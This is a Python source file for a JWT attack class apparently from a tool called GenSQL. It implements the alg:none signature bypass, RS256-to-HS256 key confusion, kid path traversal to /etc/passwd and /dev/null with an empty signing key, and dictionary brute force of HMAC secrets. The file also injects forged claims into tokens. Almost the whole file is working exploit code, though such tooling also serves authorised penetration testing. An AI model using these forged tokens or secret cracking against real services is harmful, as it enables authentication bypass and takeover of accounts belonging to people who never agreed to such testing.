#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
GenSQL JWT Attacker - JWT token exploitation
Author: Jeevraj
Supports: alg:none bypass, RS256->HS256 confusion, kid path traversal, secret bruteforce
"""

import json
import base64
import hashlib
import hmac
import re

class JWTAttacker(object):
    """JWT token attacks and exploits."""

    def __init__(self, bruteforce=False, wordlist=None, verbose=False):
        self.bruteforce = bruteforce
        self.wordlist = wordlist or self._default_wordlist()
        self.verbose = verbose
        self.cracked_secrets = {}

    def _default_wordlist(self):
        """Default JWT secret wordlist."""
        return [
            'secret', 'password', 'admin', 'test', 'key', '123456',
            'your-secret-key', 'jwt-secret', 'mysecret', 'supersecret',
            'changeme', 'admin123', 'password123', 'secret123',
            'your-256-bit-secret', 'your-secret-key-here',
        ]

    def parse_jwt(self, token):
        """
        Parse JWT token into header, payload, signature.
        
        Args:
            token: JWT token string
        
        Returns:
            Dict with header, payload, signature
        """
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            signature = parts[2]
            
            return {
                'header': header,
                'payload': payload,
                'signature': signature,
                'raw': token
            }
        except Exception as e:
            if self.verbose:
                print(f"[!] JWT parse error: {str(e)[:60]}")
            return None

    def alg_none_bypass(self, token):
        """
        Generate alg:none bypass token.
        
        Args:
            token: Original JWT token
        
        Returns:
            Modified token with alg=none
        """
        parsed = self.parse_jwt(token)
        if not parsed:
            return None
        
        # Modify header to use 'none' algorithm
        parsed['header']['alg'] = 'none'
        
        # Recreate token without signature
        header_b64 = base64.urlsafe_b64encode(json.dumps(parsed['header']).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(parsed['payload']).encode()).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}."

    def algorithm_confusion(self, token, secret):
        """
        Exploit algorithm confusion (RS256 -> HS256).
        
        Args:
            token: Original JWT token
            secret: Public key (will be used as HMAC secret)
        
        Returns:
            Modified token with HS256 algorithm
        """
        parsed = self.parse_jwt(token)
        if not parsed:
            return None
        
        # Change algorithm to HS256
        parsed['header']['alg'] = 'HS256'
        
        # Create new signature using HMAC-SHA256
        header_b64 = base64.urlsafe_b64encode(json.dumps(parsed['header']).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(parsed['payload']).encode()).decode().rstrip('=')
        
        message = f"{header_b64}.{payload_b64}"
        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{message}.{signature_b64}"

    def kid_path_traversal(self, token, payload_override=None):
        """
        Exploit kid (key ID) path traversal.
        
        Args:
            token: Original JWT token
            payload_override: Custom payload to inject
        
        Returns:
            List of malicious tokens
        """
        parsed = self.parse_jwt(token)
        if not parsed:
            return []
        
        payloads = []
        traversal_paths = [
            '../../../etc/passwd',
            '../../../dev/null',
            '/dev/null',
            '/etc/passwd',
            '....//....//....//etc/passwd',
        ]
        
        for path in traversal_paths:
            modified = parsed.copy()
            modified['header']['kid'] = path
            if payload_override:
                modified['payload'] = payload_override
            
            # Sign with empty secret (dev/null returns empty)
            token_str = self._create_token(modified['header'], modified['payload'], '')
            payloads.append(token_str)
        
        return payloads

    def bruteforce_secret(self, token, wordlist=None):
        """
        Bruteforce JWT secret.
        
        Args:
            token: JWT token to attack
            wordlist: List of secrets to try
        
        Returns:
            Found secret or None
        """
        if not wordlist:
            wordlist = self.wordlist
        
        parsed = self.parse_jwt(token)
        if not parsed:
            return None
        
        original_sig = parsed['signature']
        header_b64 = token.split('.')[0]
        payload_b64 = token.split('.')[1]
        message = f"{header_b64}.{payload_b64}"
        
        for secret in wordlist:
            # Try different algorithms
            for alg, hash_func in [('HS256', hashlib.sha256), ('HS512', hashlib.sha512)]:
                sig = hmac.new(secret.encode(), message.encode(), hash_func).digest()
                sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
                
                if sig_b64 == original_sig:
                    if self.verbose:
                        print(f"[+] JWT secret found: {secret} (algorithm: {alg})")
                    self.cracked_secrets[token[:20]] = (secret, alg)
                    return secret
        
        return None

    def payload_injection(self, token, new_claims):
        """
        Modify JWT payload claims.
        
        Args:
            token: Original JWT token
            new_claims: Dict of claims to inject
        
        Returns:
            Modified token (requires secret for proper signing)
        """
        parsed = self.parse_jwt(token)
        if not parsed:
            return None
        
        # Merge new claims
        parsed['payload'].update(new_claims)
        
        # Return unsigned token (attacker must bruteforce or find secret)
        header_b64 = base64.urlsafe_b64encode(json.dumps(parsed['header']).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(parsed['payload']).encode()).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}.UNSIGNED"

    def _create_token(self, header, payload, secret):
        """
        Create valid JWT token.
        
        Args:
            header: Header dict
            payload: Payload dict
            secret: Secret key
        
        Returns:
            JWT token string
        """
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        message = f"{header_b64}.{payload_b64}"
        sig = hmac.new(secret.encode() if secret else b'', message.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
        
        return f"{message}.{sig_b64}"

    def extract_claims(self, token):
        """
        Extract all claims from JWT.
        
        Args:
            token: JWT token
        
        Returns:
            Dict of claims
        """
        parsed = self.parse_jwt(token)
        return parsed['payload'] if parsed else {}
